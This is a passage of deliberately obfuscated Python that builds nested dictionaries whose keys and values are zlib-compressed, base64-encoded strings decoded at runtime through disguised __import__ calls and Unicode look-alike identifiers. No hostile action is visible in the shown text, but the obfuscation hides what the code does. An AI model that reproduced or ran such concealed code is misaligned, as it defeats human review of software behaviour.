__𝘪𝙢𝙥𝗼𝙧𝘁__(𝗹𝙈𝙄𝙄𝘔𝗹𝙈𝙉𝗜𝘐𝘕𝗠𝘭𝗹𝗜𝘔𝗹𝙈𝙡𝗜𝗠𝘐𝙈𝙄𝗡𝙈𝗜𝙡𝗹𝙡𝘕𝗹[𝗿𝗼𝘶𝙣𝙙(𝙖𝙗𝘴(0.0 + 0j))]).b64decode(__𝙞𝘮𝙥𝙤𝘳𝘵__(𝙡𝙈𝘐𝙄𝙈𝘭𝗠𝗡𝘐𝗜𝗡𝙈𝘭𝘭𝘐𝗠𝗹𝘔𝗹𝙄𝙈𝙄𝗠𝙄𝙉𝗠𝘐𝗹𝙡𝘭𝘕𝙡[𝙧𝗼𝙪𝘯𝗱(𝘢𝗯𝙨(0.4820772526008843 + 0.876128713446137j))]).decompress(b'x\xda\x0b4\xca\xa8L22\xcc\x01\x00\x0b\xa7\x02\x96')).decode(), __𝘪𝗺𝗽𝘰𝙧𝘵__(𝗹𝗠𝘐𝗜𝙈𝙡𝗠𝙉𝗜𝗜𝙉𝙈𝘭𝗹𝘐𝙈𝘭𝙈𝗹𝙄𝗠𝙄𝙈𝘐𝙉𝙈𝙄𝙡𝙡𝘭𝗡𝗹[𝗿𝙤𝙪𝙣𝗱(𝗮𝘣𝘴(0.0 + 0j))]).b64decode(__𝙞𝘮𝙥𝙤𝘳𝘵__(𝙡𝗠𝙄𝘐𝘔𝘭𝘔𝘕𝘐𝙄𝙉𝘔𝗹𝗹𝘐𝗠𝗹𝘔𝙡𝘐𝙈𝙄𝗠𝙄𝙉𝗠𝙄𝗹𝙡𝙡𝗡𝘭[𝘳𝙤𝘂𝙣𝘥(𝘢𝙗𝙨(0.8660884817262723 + 0.49989072988112165j))]).decompress(b'x\xda\x8br\x0f3J\x0c\xf7\xcb\x01\x00\x0bX\x02\x9c')).decode(): __𝗶𝙢𝙥𝙤𝗿𝘁__(𝗹𝙈𝗜𝙄𝘔𝘭𝙈𝗡𝘐𝘐𝘕𝘔𝘭𝙡𝙄𝗠𝙡𝘔𝗹𝗜𝘔𝗜𝙈𝘐𝙉𝙈𝙄𝗹𝗹𝘭𝗡𝗹[𝗿𝘰𝘶𝗻𝗱(𝗮𝗯𝘴(0.0 + 0j))]).b64decode(__𝙞𝙢𝗽𝙤𝙧𝘵__(𝘭𝙈𝘐𝙄𝙈𝘭𝙈𝗡𝙄𝗜𝙉𝗠𝘭𝗹𝙄𝙈𝙡𝘔𝗹𝗜𝗠𝙄𝙈𝙄𝘕𝘔𝘐𝙡𝗹𝗹𝙉𝙡[𝙧𝗼𝘶𝘯𝗱(𝗮𝗯𝘀(0.2462037937731827 + 0.9692180827510866j))]).decompress(b'x\xda\x03\x00\x00\x00\x00\x01')).decode(), __𝘪𝘮𝗽𝙤𝘳𝘁__(𝗹𝗠𝙄𝗜𝘔𝘭𝙈𝙉𝙄𝘐𝙉𝙈𝘭𝗹𝘐𝗠𝘭𝙈𝙡𝙄𝘔𝙄𝘔𝗜𝘕𝘔𝘐𝙡𝘭𝗹𝙉𝙡[𝘳𝘰𝙪𝘯𝙙(𝘢𝗯𝘴(0.0 + 0j))]).b64decode(__𝗶𝙢𝗽𝗼𝙧𝘵__(𝙡𝘔𝙄𝙄𝗠𝗹𝗠𝘕𝘐𝘐𝗡𝙈𝗹𝙡𝙄𝘔𝘭𝘔𝗹𝗜𝘔𝙄𝗠𝘐𝗡𝙈𝗜𝙡𝘭𝙡𝙉𝘭[𝘳𝙤𝘂𝘯𝙙(𝙖𝙗𝙨(0.24758836017526165 + 0.9688653177329266j))]).decompress(b'x\xdaK6\xce\xa9Jq\x0f+\x890\xaa(\x8b4r+\x8e\n\xb4\xb5\x05\x00J\x83\x06\xd3')).decode(): __𝙞𝙢𝗽𝘰𝗿𝘵__(𝘭𝙈𝗜𝘐𝙈𝗹𝗠𝙉𝙄𝗜𝗡𝙈𝘭𝘭𝙄𝗠𝗹𝘔𝗹𝗜𝗠𝗜𝗠𝗜𝗡𝘔𝙄𝘭𝗹𝘭𝗡𝘭[𝙧𝘰𝘂𝘯𝘥(𝗮𝘣𝙨(0.0 + 0j))]).b64decode(__𝗶𝗺𝙥𝗼𝙧𝘁__(𝗹𝙈𝗜𝘐𝘔𝗹𝙈𝘕𝗜𝘐𝙉𝗠𝘭𝗹𝙄𝘔𝙡𝗠𝗹𝘐𝘔𝗜𝗠𝘐𝙉𝘔𝗜𝗹𝘭𝘭𝙉𝗹[𝘳𝙤𝘂𝙣𝗱(𝗮𝗯𝘴(0.348319603747275 + 0.9373758337216409j))]).decompress(b'x\xda\x8b\n7)\t2\xf0\xb4\x05\x00\x0b\\\x02b')).decode(), __𝘪𝗺𝙥𝗼𝙧𝙩__(𝗹𝘔𝙄𝘐𝗠𝗹𝗠𝗡𝙄𝙄𝙉𝘔𝘭𝘭𝙄𝗠𝗹𝗠𝙡𝘐𝗠𝗜𝘔𝗜𝙉𝙈𝙄𝘭𝙡𝙡𝗡𝘭[𝗿𝙤𝙪𝗻𝙙(𝙖𝗯𝙨(0.0 + 0j))]).b64decode(__𝗶𝗺𝙥𝘰𝗿𝙩__(𝘭𝗠𝗜𝙄𝙈𝘭𝙈𝙉𝘐𝘐𝘕𝙈𝗹𝙡𝘐𝙈𝗹𝙈𝘭𝙄𝙈𝙄𝗠𝙄𝘕𝙈𝗜𝗹𝗹𝗹𝘕𝙡[𝘳𝘰𝘂𝘯𝗱(𝙖𝗯𝙨(0.3243934300460989 + 0.9459222497345787j))]).decompress(b'x\xda\x8b\xcc\xf3*K1\xf6\xcbI\xce\xb14L6\n\xab\x8c0r\xcb\x8b\n75\x00\x00f\x12\x07\xca')).decode(): __𝗶𝙢𝙥𝗼𝙧𝘁__(𝗹𝙈𝘐𝘐𝗠𝘭𝙈𝗡𝘐𝗜𝘕𝗠𝘭𝗹𝘐𝗠𝘭𝘔𝘭𝗜𝙈𝘐𝘔𝘐𝗡𝘔𝗜𝗹𝗹𝘭𝗡𝗹[𝗿𝙤𝘂𝘯𝗱(𝘢𝙗𝘴(0.0 + 0j))]).b64decode(__𝗶𝗺𝗽𝙤𝙧𝙩__(𝘭𝗠𝘐𝗜𝙈𝗹𝗠𝙉𝙄𝘐𝗡𝙈𝗹𝗹𝘐𝗠𝙡𝗠𝗹𝘐𝙈𝗜𝗠𝙄𝗡𝘔𝗜𝘭𝘭𝘭𝘕𝙡[𝙧𝘰𝘂𝗻𝘥(𝘢𝘣𝘴(0.018317565192764507 + 0.9998322193275273j))]).decompress(b'x\xda\r\xcd\xcb\n\x84 \x14\x00\xd0o\xca\x89y,Z\x94\xd1kT\xb0,\xad]\x12\xdc(\x83(\xaa\xd1\xaf\x9f>\xe0p\x84\xfc<{\xf9\xdb\xdb\xea\xed\x91)\x84o2\xacz)\xcf\xe1AA\x18\x0eT\x84\x07\x8dwh\x909\xd8\xc4_y\x06\x88\xe1\x19\xb8\x8a.\x9d6\xaa\x93\x05\xe9\x15?\x99\xa0\x0f2Q\x94\xe3\x91TI\xc9\x04\xbe@\xa7f\xeb\xaa(\xeb$\xdb\xb4\xbd\r\x1a\xadF\x9e!n\xbe\xee\xeb`1w\x14\xfb\x96\x8a\x1cj\x94,\xad*V\xe2j\xc7\xac\xef\x18\x04\xc1\x1f&\x8a4\xfb')).decode(), __𝘪𝗺𝙥𝘰𝙧𝘵__(𝘭𝗠𝙄𝗜𝘔𝙡𝘔𝘕𝙄𝙄𝗡𝗠𝗹𝗹𝙄𝙈𝘭𝗠𝘭𝘐𝙈𝗜𝙈𝘐𝙉𝗠𝘐𝙡𝘭𝙡𝙉𝙡[𝙧𝗼𝘶𝗻𝙙(𝙖𝙗𝙨(0.0 + 0j))]).b64decode(__𝗶𝗺𝗽𝘰𝙧𝙩__(𝙡𝗠𝘐𝘐𝙈𝗹𝘔𝘕𝗜𝘐𝙉𝘔𝙡𝗹𝗜𝙈𝙡𝙈𝗹𝙄𝗠𝘐𝙈𝘐𝙉𝗠𝗜𝙡𝗹𝙡𝙉𝙡[𝘳𝘰𝙪𝗻𝘥(𝗮𝘣𝘴(0.9500312201956927 + 0.3121548984934933j))]).decompress(b'x\xda\x8b\xcc\xf3*K1\xf6\xcbI\xce\xb14\x8a\x8a\xf0\xaaJ\x0c\xb7,\x05\x00IC\x06\xef')).decode(): __𝘪𝘮𝘱𝙤𝗿𝘵__(𝙡𝗠𝘐𝙄𝙈𝘭𝙈𝙉𝘐𝘐𝙉𝘔𝘭𝙡𝘐𝗠𝙡𝙈𝗹𝗜𝗠𝘐𝙈𝙄𝘕𝗠𝙄𝗹𝗹𝙡𝘕𝘭[𝘳𝗼𝘂𝙣𝗱(𝘢𝙗𝘀(0.0 + 0j))]).b64decode(__𝘪𝙢𝙥𝗼𝘳𝙩__(𝘭𝙈𝘐𝘐𝘔𝗹𝘔𝗡𝗜𝙄𝘕𝙈𝗹𝘭𝙄𝙈𝗹𝘔𝘭𝗜𝗠𝙄𝙈𝘐𝗡𝗠𝗜𝘭𝙡𝙡𝙉𝗹[𝘳𝘰𝘶𝘯𝙙(𝙖𝘣𝘴(0.855761715552068 + 0.5173701636114915j))]).decompress(b'x\xda\xf3\x0fq,\xf5u61\xf0s\xf1-\xf7\xc9\xf2\xac\xf0M\xb7\xb5\x05\x00A\x11\x06I')).decode(), __𝘪𝗺𝗽𝘰𝗿𝙩__(𝙡𝗠𝙄𝘐𝗠𝗹𝘔𝙉𝘐𝗜𝙉𝗠𝘭𝗹𝙄𝗠𝘭𝙈𝗹𝗜𝘔𝙄𝗠𝘐𝗡𝘔𝗜𝘭𝙡𝙡𝘕𝗹[𝗿𝙤𝙪𝘯𝗱(𝙖𝙗𝙨(0.0 + 0j))]).b64decode(__𝙞𝗺𝘱𝘰𝗿𝙩__(𝗹𝗠𝘐𝙄𝙈𝘭𝗠𝘕𝗜𝙄𝙉𝘔𝙡𝙡𝙄𝙈𝘭𝗠𝙡𝙄𝗠𝙄𝘔𝙄𝙉𝗠𝘐𝘭𝙡𝘭𝙉𝙡[𝘳𝘰𝘂𝗻𝙙(𝘢𝙗𝘀(0.8104950946947553 + 0.5857454237770361j))]).decompress(b'x\xdaK2\xf6KK\xc9\r\xabL6\xca)KJ\xb7\xb5\x05\x000[\x05\xa4')).decode(): __𝙞𝗺𝙥𝗼𝙧𝙩__(𝙡𝙈𝗜𝘐𝙈𝘭𝗠𝘕𝙄𝙄𝘕𝘔𝙡𝗹𝙄𝙈𝙡𝙈𝘭𝙄𝗠𝘐𝘔𝙄𝗡𝗠𝗜𝘭𝙡𝗹𝘕𝘭[𝙧𝗼𝙪𝗻𝘥(𝙖𝙗𝙨(0.0 + 0j))]).b64decode(__𝙞𝘮𝙥𝗼𝙧𝙩__(𝗹𝗠𝘐𝗜𝘔𝘭𝘔𝘕𝘐𝗜𝗡𝗠𝘭𝗹𝘐𝘔𝗹𝗠𝗹𝙄𝘔𝗜𝗠𝘐𝗡𝗠𝗜𝙡𝘭𝙡𝘕𝗹[𝗿𝗼𝘂𝘯𝗱(𝙖𝙗𝙨(0.8904765073727949 + 0.4550292186411205j))]).decompress(b'x\xda\xf3\rq\xb4\x05\x00\x02\xf3\x01 ')).decode(), __𝗶𝗺𝙥𝗼𝘳𝘁__(𝗹𝗠𝙄𝙄𝘔𝙡𝙈𝗡𝙄𝘐𝘕𝙈𝘭𝘭𝙄𝗠𝗹𝗠𝗹𝗜𝙈𝗜𝙈𝗜𝘕𝙈𝗜𝘭𝘭𝙡𝙉𝘭[𝗿𝘰𝙪𝙣𝘥(𝗮𝘣𝘴(0.0 + 0j))]).b64decode(__𝙞𝙢𝗽𝙤𝘳𝘵__(𝗹𝘔𝙄𝗜𝗠𝗹𝘔𝗡𝗜𝘐𝙉𝗠𝙡𝘭𝙄𝙈𝗹𝗠𝗹𝙄𝙈𝗜𝘔𝗜𝗡𝙈𝗜𝙡𝙡𝙡𝗡𝗹[𝙧𝙤𝘶𝗻𝘥(𝙖𝙗𝘀(0.4189953291885139 + 0.9079883887573722j))]).decompress(b'x\xdaK\xce\r\xcb\x8d\x8a\xf0\xaa\x8c\x8a\xf0\xb4\x05\x00\x1d \x04A')).decode(): __𝘪𝙢𝗽𝗼𝙧𝘁__(𝘭𝘔𝙄𝗜𝗠𝗹𝙈𝘕𝙄𝗜𝗡𝗠𝗹𝗹𝙄𝗠𝗹𝗠𝘭𝙄𝗠𝗜𝗠𝙄𝙉𝗠𝙄𝘭𝘭𝙡𝙉𝙡[𝘳𝗼𝘂𝗻𝘥(𝘢𝙗𝙨(0.0 + 0j))]).b64decode(__𝙞𝘮𝗽𝙤𝘳𝘵__(𝘭𝙈𝙄𝘐𝙈𝗹𝙈𝙉𝘐𝙄𝙉𝘔𝗹𝘭𝙄𝘔𝘭𝗠𝙡𝗜𝘔𝘐𝗠𝘐𝗡𝙈𝘐𝙡𝘭𝘭𝙉𝗹[𝙧𝗼𝙪𝘯𝗱(𝘢𝗯𝘴(0.4969293756429607 + 0.8677909861384233j))]).decompress(b'x\xda\x03\x00\x00\x00\x00\x01')).decode(), __𝙞𝘮𝘱𝗼𝘳𝘵__(𝘭𝗠𝗜𝙄𝙈𝗹𝙈𝗡𝙄𝙄𝗡𝙈𝙡𝗹𝙄𝘔𝘭𝘔𝙡𝙄𝘔𝗜𝙈𝘐𝘕𝘔𝙄𝘭𝙡𝗹𝘕𝗹[𝘳𝘰𝘂𝘯𝗱(𝗮𝘣𝘀(0.0 + 0j))]).b64decode(__𝗶𝘮𝘱𝗼𝗿𝘵__(𝗹𝗠𝗜𝘐𝗠𝙡𝗠𝙉𝘐𝘐𝙉𝘔𝗹𝗹𝘐𝘔𝙡𝘔𝗹𝘐𝙈𝘐𝗠𝘐𝘕𝘔𝙄𝗹𝗹𝙡𝗡𝘭[𝘳𝘰𝘂𝘯𝗱(𝙖𝙗𝙨(0.25086871389322296 + 0.9680211198055342j))]).decompress(b'x\xdaK\xce\r\xcb\x8d\x8a\xf0\xaaL\x0c7\xcd\x8b0\n*K\nw+HJ\xb7\xb5\x05\x00lK\x08h')).decode(): __𝙞𝘮𝘱𝙤𝗿𝘁__(𝗹𝗠𝘐𝘐𝗠𝙡𝙈𝘕𝘐𝙄𝙉𝘔𝗹𝘭𝘐𝙈𝘭𝙈𝗹𝗜𝘔𝙄𝙈𝗜𝘕𝘔𝙄𝙡𝘭𝙡𝙉𝘭[𝗿𝙤𝘶𝘯𝗱(𝗮𝙗𝘀(0.0 + 0j))]).b64decode(__𝙞𝗺𝙥𝗼𝘳𝘁__(𝘭𝙈𝙄𝘐𝙈𝘭𝙈𝘕𝗜𝙄𝘕𝙈𝗹𝙡𝙄𝙈𝗹𝘔𝙡𝗜𝘔𝘐𝙈𝙄𝗡𝘔𝙄𝙡𝘭𝘭𝘕𝙡[𝘳𝙤𝙪𝙣𝙙(𝘢𝙗𝙨(0.9756718698327155 + 0.2192359514704026j))]).decompress(b'x\xda\x03\x00\x00\x00\x00\x01')).decode(), __𝘪𝘮𝙥𝙤𝗿𝘁__(𝗹𝗠𝙄𝘐𝙈𝘭𝘔𝘕𝗜𝗜𝙉𝗠𝗹𝘭𝙄𝙈𝗹𝗠𝘭𝗜𝙈𝙄𝙈𝙄𝙉𝗠𝘐𝙡𝘭𝘭𝙉𝘭[𝗿𝙤𝘂𝘯𝗱(𝙖𝗯𝙨(0.0 + 0j))]).b64decode(__𝗶𝙢𝗽𝘰𝗿𝙩__(𝙡𝘔𝘐𝙄𝗠𝙡𝙈𝗡𝗜𝗜𝙉𝘔𝘭𝗹𝙄𝘔𝙡𝘔𝙡𝘐𝗠𝙄𝙈𝗜𝙉𝘔𝘐𝗹𝙡𝘭𝘕𝘭[𝘳𝗼𝘶𝘯𝙙(𝘢𝘣𝙨(0.6922530276958322 + 0.7216548660169578j))]).decompress(b'x\xdaK\xce\r\xcb\x8d\x8a\xf0\xaa\x04\xe2\xb4H\xe3\xb0\xca\xe4\xdc\xb0\xd2\x14G[[\x00m\xb3\x08\x80')).decode(): __𝘪𝙢𝘱𝙤𝗿𝘁__(𝗹𝗠𝙄𝘐𝗠𝘭𝗠𝘕𝗜𝗜𝙉𝘔𝗹𝘭𝘐𝙈𝗹𝗠𝘭𝗜𝘔𝘐𝗠𝗜𝗡𝙈𝗜𝘭𝙡𝙡𝙉𝘭[𝗿𝙤𝙪𝙣𝘥(𝗮𝙗𝙨(0.0 + 0j))]).b64decode(__𝗶𝗺𝙥𝘰𝘳𝘵__(𝗹𝘔𝘐𝘐𝗠𝙡𝘔𝙉𝗜𝙄𝙉𝗠𝗹𝙡𝗜𝗠𝗹𝘔𝙡𝙄𝘔𝘐𝙈𝗜𝗡𝗠𝙄𝙡𝘭𝙡𝘕𝗹[𝗿𝗼𝘶𝗻𝗱(𝘢𝘣𝙨(0.22104845874508683 + 0.9752628255431567j))]).decompress(b'x\xda\x03\x00\x00\x00\x00\x01')).decode(), __𝗶𝘮𝙥𝗼𝘳𝘁__(𝗹𝘔𝘐𝘐𝘔𝗹𝘔𝘕𝗜𝘐𝗡𝗠𝗹𝗹𝙄𝙈𝘭𝗠𝗹𝗜𝙈𝙄𝙈𝘐𝙉𝘔𝗜𝗹𝘭𝙡𝘕𝙡[𝘳𝙤𝘶𝘯𝗱(𝗮𝘣𝙨(0.0 + 0j))]).b64decode(__𝗶𝗺𝙥𝘰𝗿𝘁__(𝘭𝗠𝗜𝘐𝙈𝘭𝘔𝘕𝘐𝙄𝙉𝗠𝙡𝗹𝘐𝙈𝘭𝙈𝗹𝙄𝘔𝗜𝗠𝙄𝙉𝙈𝘐𝙡𝘭𝘭𝙉𝙡[𝙧𝘰𝘂𝘯𝘥(𝗮𝗯𝘴(0.43763544882783223 + 0.8991524975938519j))]).decompress(b'x\xdaK\xce\r\xcb\x8d\x8a\xf0\xaaL\x0c7\xcd\x8b0\n*K\nw+H\xca\xb1\xccJ\x01\x8aE\x85\x9b\x1a\x00\x00\xbd\xd7\x0b+')).decode(): __𝙞𝙢𝙥𝘰𝙧𝘵__(𝗹𝗠𝗜𝘐𝗠𝙡𝗠𝘕𝘐𝙄𝗡𝗠𝘭𝘭𝘐𝘔𝗹𝘔𝗹𝙄𝗠𝗜𝘔𝙄𝙉𝙈𝗜𝙡𝘭𝗹𝘕𝘭[𝘳𝘰𝘂𝙣𝗱(𝗮𝙗𝘀(0.0 + 0j))]).b64decode(__𝗶𝙢𝘱𝗼𝗿𝘵__(𝘭𝙈𝙄𝙄𝙈𝗹𝗠𝙉𝙄𝙄𝗡𝘔𝙡𝘭𝘐𝘔𝗹𝗠𝘭𝙄𝗠𝙄𝘔𝘐𝙉𝘔𝘐𝘭𝗹𝘭𝙉𝙡[𝗿𝗼𝙪𝘯𝘥(𝘢𝗯𝘀(0.012836189318729874 + 0.9999176127280556j))]).decompress(b'x\xda\x03\x00\x00\x00\x00\x01')).decode(), __𝙞𝘮𝙥𝗼𝘳𝘵__(𝙡𝙈𝗜𝙄𝘔𝙡𝘔𝙉𝘐𝙄𝘕𝙈𝗹𝘭𝗜𝘔𝙡𝘔𝗹𝗜𝗠𝗜𝙈𝙄𝗡𝙈𝘐𝘭𝗹𝗹𝙉𝙡[𝘳𝘰𝘶𝙣𝙙(𝗮𝘣𝘴(0.0 + 0j))]).b64decode(__𝙞𝘮𝘱𝗼𝙧𝘵__(𝙡𝘔𝙄𝗜𝙈𝗹𝘔𝙉𝗜𝘐𝘕𝘔𝗹𝘭𝙄𝙈𝘭𝙈𝗹𝙄𝗠𝗜𝙈𝗜𝘕𝗠𝘐𝘭𝘭𝗹𝘕𝗹[𝘳𝘰𝙪𝗻𝗱(𝙖𝘣𝘀(0.0035277750942385167 + 0.9999937773820817j))]).decompress(b'x\xdaK\xce\r+\x8e\nw\xab\x8a\n\xb3\xccJtw+M\x02\xf2\x01M\x07\x07Y')).decode(): __𝘪𝘮𝘱𝙤𝘳𝘵__(𝘭𝘔𝘐𝙄𝘔𝙡𝙈𝘕𝙄𝘐𝙉𝗠𝗹𝘭𝘐𝘔𝗹𝙈𝙡𝙄𝗠𝗜𝙈𝙄𝘕𝘔𝘐𝘭𝗹𝙡𝗡𝙡[𝘳𝘰𝙪𝙣𝙙(𝙖𝘣𝘀(0.0 + 0j))]).b64decode(__𝘪𝗺𝘱𝘰𝗿𝘵__(𝙡𝙈𝘐𝗜𝗠𝗹𝙈𝘕𝘐𝙄𝗡𝙈𝙡𝗹𝗜𝗠𝗹𝙈𝗹𝙄𝙈𝗜𝙈𝘐𝙉𝗠𝙄𝘭𝗹𝙡𝙉𝘭[𝙧𝗼𝙪𝙣𝙙(𝙖𝙗𝙨(0.4396729693126832 + 0.8981579371445583j))]).decompress(b'x\xdaK6\x0e\xca\x88\xcc\xad\xc8\x01\x00\x0c\x80\x02\xfb')).decode(), __𝘪𝗺𝘱𝘰𝘳𝘁__(𝘭𝗠𝘐𝗜𝘔𝘭𝗠𝗡𝘐𝙄𝗡𝙈𝗹𝘭𝙄𝗠𝘭𝙈𝗹𝗜𝘔𝙄𝘔𝘐𝘕𝗠𝙄𝘭𝗹𝗹𝙉𝘭[𝘳𝘰𝘂𝙣𝘥(𝗮𝙗𝘀(0.0 + 0j))]).b64decode(__𝘪𝙢𝘱𝗼𝗿𝘵__(𝗹𝙈𝙄𝘐𝙈𝗹𝙈𝗡𝗜𝗜𝙉𝗠𝘭𝘭𝗜𝗠𝗹𝗠𝙡𝙄𝙈𝗜𝗠𝗜𝗡𝗠𝙄𝘭𝗹𝘭𝙉𝗹[𝗿𝗼𝙪𝗻𝙙(𝘢𝘣𝘴(0.6072597012906056 + 0.7945034016216951j))]).decompress(b'x\xda\x8b4\xaa(\x88\n75\x880\xf22L\x0c\xaf\xc8\x8e025L\n\xf7\xcaIN\xb7\xb5\x05\x00\x80\x02\x08\xcd')).decode(): __𝗶𝙢𝗽𝙤𝘳𝘁__(𝗹𝙈𝘐𝙄𝗠𝙡𝙈𝗡𝘐𝙄𝗡𝗠𝘭𝘭𝘐𝘔𝗹𝗠𝙡𝘐𝗠𝗜𝗠𝗜𝘕𝗠𝗜𝘭𝗹𝙡𝘕𝗹[𝗿𝗼𝘂𝙣𝘥(𝗮𝘣𝙨(0.0 + 0j))]).b64decode(__𝗶𝘮𝘱𝙤𝙧𝘁__(𝘭𝘔𝗜𝙄𝘔𝙡𝗠𝙉𝗜𝙄𝗡𝗠𝙡𝙡𝘐𝙈𝘭𝗠𝗹𝘐𝙈𝘐𝙈𝘐𝘕𝙈𝗜𝘭𝙡𝗹𝘕𝙡[𝙧𝘰𝘶𝗻𝙙(𝘢𝘣𝘀(0.761752554908605 + 0.6478680769186059j))]).decompress(b'x\xda\xf3w\t\xad\xf0uI\xb7\x05\x00\x0b\xbd\x02\x96')).decode(), __𝗶𝙢𝘱𝗼𝘳𝙩__(𝗹𝗠𝙄𝘐𝙈𝘭𝘔𝗡𝘐𝙄𝗡𝗠𝘭𝗹𝙄𝗠𝗹𝙈𝙡𝗜𝙈𝘐𝙈𝙄𝗡𝙈𝘐𝙡𝙡𝘭𝘕𝗹[𝙧𝙤𝙪𝘯𝙙(𝙖𝙗𝙨(0.0 + 0j))]).b64decode(__𝗶𝗺𝘱𝘰𝗿𝙩__(𝘭𝗠𝙄𝘐𝙈𝗹𝘔𝘕𝙄𝘐𝘕𝗠𝘭𝘭𝙄𝘔𝘭𝙈𝘭𝙄𝙈𝗜𝘔𝙄𝘕𝗠𝗜𝗹𝘭𝘭𝗡𝗹[𝙧𝗼𝘶𝘯𝘥(𝗮𝘣𝙨(0.14473648996741484 + 0.9894702362738924j))]).decompress(b'x\xda\x8b4\xaa(\x88\n75\x880\n3\x02\xd3\xc6~e)\x11^YQ\x81\xb6\xb6\x00|\xeb\x08\x96')).decode(): __𝗶𝘮𝙥𝙤𝙧𝘵__(𝙡𝗠𝙄𝘐𝙈𝙡𝙈𝙉𝗜𝗜𝙉𝘔𝘭𝗹𝙄𝘔𝘭𝙈𝙡𝙄𝘔𝘐𝘔𝙄𝗡𝗠𝘐𝗹𝘭𝘭𝘕𝙡[𝘳𝗼𝙪𝗻𝙙(𝗮𝘣𝘀(0.0 + 0j))]).b64decode(__𝗶𝙢𝗽𝙤𝘳𝙩__(𝙡𝘔𝙄𝗜𝙈𝘭𝙈𝙉𝗜𝙄𝗡𝙈𝙡𝙡𝗜𝘔𝘭𝗠𝙡𝙄𝙈𝙄𝗠𝙄𝙉𝗠𝗜𝘭𝗹𝙡𝙉𝗹[𝙧𝙤𝘶𝙣𝗱(𝗮𝗯𝘀(0.8240483913067627 + 0.5665194160703908j))]).decompress(b'x\xdaK\xca\x0b+Nr\xb4\xb5\x05\x00\r_\x02\xb7')).decode()}, __𝘪𝙢𝘱𝗼𝘳𝙩__(𝗹𝗠𝙄𝙄𝘔𝘭𝙈𝘕𝗜𝙄𝘕𝘔𝗹𝘭𝗜𝘔𝗹𝗠𝙡𝗜𝘔𝘐𝙈𝙄𝘕𝙈𝗜𝗹𝗹𝙡𝗡𝙡[𝙧𝗼𝘂𝘯𝗱(𝙖𝘣𝘴(0.0 + 0j))]).b64decode(__𝗶𝘮𝘱𝘰𝗿𝘁__(𝗹𝘔𝘐𝘐𝗠𝗹𝘔𝙉𝙄𝗜𝘕𝗠𝙡𝗹𝙄𝙈𝘭𝗠𝘭𝗜𝗠𝗜𝗠𝙄𝗡𝙈𝙄𝙡𝙡𝗹𝘕𝘭[𝙧𝙤𝘂𝙣𝗱(𝙖𝗯𝘴(0.4954562749279049 + 0.8686328796646857j))]).decompress(b'x\xdaK\xf6\xf0\xcaI6\n+\x8d4\n\xb5\x05\x00\x1a\x1c\x03\xdf')).decode(): {__𝗶𝗺𝗽𝘰𝗿𝘁__(𝗹𝙈𝗜𝘐𝘔𝘭𝙈𝙉𝙄𝗜𝗡𝗠𝘭𝘭𝙄𝙈𝙡𝗠𝗹𝙄𝘔𝘐𝘔𝗜𝙉𝘔𝘐𝘭𝙡𝘭𝗡𝘭[𝗿𝙤𝘂𝘯𝗱(𝙖𝙗𝘴(0.0 + 0j))]).b64decode(__𝙞𝗺𝗽𝗼𝘳𝙩__(𝗹𝗠𝙄𝗜𝙈𝗹𝙈𝘕𝗜𝘐𝘕𝗠𝘭𝘭𝘐𝙈𝙡𝗠𝙡𝘐𝗠𝙄𝙈𝙄𝙉𝗠𝙄𝙡𝙡𝘭𝗡𝙡[𝘳𝘰𝙪𝙣𝗱(𝘢𝗯𝙨(0.7929560393327778 + 0.6092788521569366j))]).decompress(b'x\xdaK6\x0e\xcaH\xf1\x08\xab\x02\x00\x0c\x07\x02\xcd')).decode(): 𝘳𝙖𝙣𝙙𝙤𝙢.choice(𝘴𝘵𝘢𝘁𝙪𝙨), __𝘪𝘮𝙥𝗼𝘳𝘵__(𝙡𝗠𝘐𝘐𝗠𝗹𝘔𝗡𝘐𝗜𝘕𝘔𝙡𝙡𝙄𝘔𝗹𝗠𝗹𝙄𝙈𝙄𝙈𝗜𝗡𝗠𝗜𝘭𝗹𝙡𝙉𝗹[𝗿𝘰𝙪𝗻𝘥(𝘢𝘣𝘴(0.0 + 0j))]).b64decode(__𝙞𝗺𝙥𝗼𝙧𝙩__(𝙡𝘔𝙄𝘐𝘔𝙡𝙈𝗡𝘐𝘐𝗡𝙈𝗹𝙡𝘐𝙈𝙡𝘔𝗹𝙄𝘔𝙄𝙈𝗜𝗡𝗠𝗜𝗹𝙡𝘭𝙉𝘭[𝘳𝗼𝘶𝘯𝗱(𝘢𝙗𝘀(0.2238173958744557 + 0.9746310960070877j))]).decompress(b'x\xdaK6\xca)\x8d4\n\xb5\x05\x00\x0c0\x02\x94')).decode(): 𝗿𝗼𝘶𝘯𝗱(𝙖𝙗𝘴(0.0 + 0j)), __𝗶𝙢𝘱𝘰𝗿𝘵__(𝘭𝘔𝙄𝘐𝗠𝗹𝘔𝘕𝙄𝗜𝘕𝗠𝙡𝙡𝙄𝗠𝙡𝗠𝙡𝘐𝘔𝙄𝙈𝗜𝙉𝘔𝘐𝘭𝘭𝗹𝗡𝙡[𝗿𝗼𝘶𝘯𝗱(𝙖𝗯𝘀(0.0 + 0j))]).b64decode(__𝙞𝗺𝗽𝙤𝘳𝙩__(𝙡𝙈𝗜𝘐𝘔𝙡𝘔𝙉𝗜𝙄𝙉𝙈𝗹𝘭𝗜𝙈𝗹𝗠𝗹𝙄𝙈𝘐𝘔𝗜𝗡𝙈𝗜𝗹𝘭𝗹𝗡𝙡[𝘳𝗼𝘶𝘯𝗱(𝘢𝙗𝙨(0.6138673706753457 + 0.789409178576065j))]).decompress(b'x\xda\x8b\x0c\xf73H\x8c\x88*Hq\xcf\xc9I.\xb7\xb5\x05\x00.\x92\x05\x89')).decode(): [], __𝗶𝗺𝘱𝙤𝗿𝘁__(𝙡𝘔𝘐𝙄𝙈𝙡𝘔𝗡𝗜𝙄𝘕𝙈𝙡𝙡𝙄𝗠𝘭𝙈𝙡𝙄𝙈𝙄𝘔𝙄𝘕𝙈𝘐𝙡𝘭𝗹𝘕𝗹[𝘳𝗼𝘶𝗻𝘥(𝙖𝙗𝙨(0.0 + 0j))]).b64decode(__𝗶𝙢𝘱𝗼𝗿𝙩__(𝗹𝘔𝘐𝗜𝗠𝙡𝗠𝙉𝗜𝙄𝘕𝘔𝗹𝘭𝗜𝙈𝗹𝗠𝘭𝗜𝘔𝗜𝗠𝘐𝙉𝙈𝘐𝗹𝗹𝘭𝘕𝘭[𝘳𝗼𝙪𝘯𝘥(𝘢𝗯𝘀(0.5143045308656492 + 0.8576076314557051j))]).decompress(b'x\xda\x8b\x0c\x8f*\x02\x00\x03\x93\x01}')).decode(): False}, 